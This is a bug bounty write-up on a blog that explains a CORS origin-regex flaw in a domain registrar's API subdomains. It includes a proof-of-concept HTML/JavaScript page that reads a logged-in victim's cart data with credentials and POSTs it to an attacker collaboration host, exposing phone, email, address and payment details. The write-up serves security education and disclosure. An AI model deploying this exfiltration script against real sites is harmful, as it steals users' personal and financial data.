---
title: Sensitive Data Leak using Cors Misconfiguration in prominent Domain Registrar
url: https://infosecwriteups.com/sensitive-data-leak-using-cors-misconfiguration-in-prominent-domain-registrar-b3010e4e6501?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-10-07
fetch_date: 2025-10-06T18:50:27.339186
---

# Sensitive Data Leak using Cors Misconfiguration in prominent Domain Registrar

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb3010e4e6501&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsensitive-data-leak-using-cors-misconfiguration-in-prominent-domain-registrar-b3010e4e6501&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fsensitive-data-leak-using-cors-misconfiguration-in-prominent-domain-registrar-b3010e4e6501&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-b3010e4e6501---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-b3010e4e6501---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Sensitive Data Leak using Cors Misconfiguration in prominent Domain Registrar

[![Ronak Patel](https://miro.medium.com/v2/resize:fill:64:64/1*yV1aLbdrDBM9XZBdntF_kQ.jpeg)](https://ronak-9889.medium.com/?source=post_page---byline--b3010e4e6501---------------------------------------)

[Ronak Patel](https://ronak-9889.medium.com/?source=post_page---byline--b3010e4e6501---------------------------------------)

4 min read

·

Oct 5, 2024

--

3

Listen

Share

Press enter or click to view image in full size

![]()

Hello Guys,

Hope Everything’s fine.

This article is about Cors misconfiguration bug which i found in different api endpoints/api subdomains of prominent domain registrar. I worked with this program for almost more than year and reported totally 25 bugs which secured me 7th rank on their Global Leaderboard. Out of 25 ,16 bugs were just CORS issue on different endpoints. They self duplicated four or five reports and paid for rest of the bugs.

Before starting about the vulnerability let me me tell you about the infrastructure of this program. This is private program and contains a lot of subdomains. It has structure like for example there is a feature for cart then all the api request associated with the cart would go through “cart.api.example.com” similarly for the rest functionality like payment would use “payment.api.example.com”, domain functionality would use “domains.api.example.com” , social media connection would use “social-sdk.api.example.com” and more.

***Cors Misconfiguration(Regex issue)***

So while testing for bugs, I found CORS issue site-wide which contains regex validation misconfiguration and some endpoints allowed even null origin. I would cover Regex issue below.

For those who are not familiar with what is CORS and how CORS misconfiguration could be exploited , I would recommend below article from Portswigger

[## What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy

### In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of…

portswigger.net](https://portswigger.net/web-security/cors?source=post_page-----b3010e4e6501---------------------------------------)

Now, You are aware with what is CORS and How its misconfiguration could be exploited ,let’s get back to our Bug. There was a functionality to add item to cart and once user/victim add any item to cart it was added to Basket. API request for basket was GET XHR “[https://cart.example.com/api/basket](https://cart.godaddy.com/api/basket%22)”

Sever was validating Origin header and preventing null origin or any other cross origin. It was accepting request from origin like example.com or subdomain.example.com like cart.example.com,payment.api.example.com and more. So far so good, everything is as expected and looks secure so where is the BUG???

Server was using regex to check the origin and issue was that it was checking only origin header should end with “example.com” .

For example, there is subdomain cart.api.example.com so request would bypassed using origin with the cartaapiaexample.com which ends up with example.com hence would bypass regex check and attacker could fetch victim’s response containing sensitive data.

We know the BUG now but challenging task is how to create POC (Proof of Concept) which proves it is exploitable in real world. Let me describe below what setup i did to host poc and exploit it.

I configured xampp server in my local system as referred below,set the host entry with testexample.com pointing to 127.0.0.1 and lastly moving cart\_cors\_fetch.html(poc) file to htdocs .

[## Installing and Configuring XAMPP on Windows 11

### This article provides a comprehensive guide on installing XAMPP, the popular PHP development environment, on Windows…

www.c-sharpcorner.com](https://www.c-sharpcorner.com/article/installing-and-configuring-xampp-on-windows-11/?source=post_page-----b3010e4e6501---------------------------------------)

POC file was containing below config.

```
<html>

  <body>
    <script>
      fetch('https://cart.example.com/api/basket', {
        method: 'GET',
        credentials: 'include'
      })
      .then(response => response.text())
      .then(data => {
        var postData = 'data=' + encodeURIComponent(data);
        fetch('http://hvgaosa4e1t6d23tb3eilupjaag14tsi.oastify.com', { //attacker server
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          mode: 'no-cors', // Enable no-cors mode
          body: postData
        });
      });
    </script>
  </body>
</html>
```

Now, I logged in as a victim in browser and run POC in another tab using url “http://testexample.com/cart\_cors\_fetch.html” .

Press enter or click to view image in full size

![]()

As seen above request went through our hosted domain and response was received at attacker server which contains victim’s phone,email,address,cart items and more

Press enter or click to view image in full size

![]()

Similarly, I was able to demonstrate that social api allows to fetch victim’s social connection information , social ads api allows to fetch victim’s campaign details ,seo api allows to perform seo operations behalf of victim,payapi allows to fectch victim’s payment details ,address,email,phone and more other endpoints .

Hope this article was informative and would helpful in your learning journey. Thanks for reading.

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----b3010e4e6501---------------------------------------)

[Bug Bounty Writeup](https://medium.com/tag/bug-bounty-writeup?source=post_page-----b3010e4e6501---------------------------------------)

[Information Security](https://medium.com/tag/information-security?source=post_page-----b3010e4e6501---------------------------------------)

[Ethical Hacking](https://m...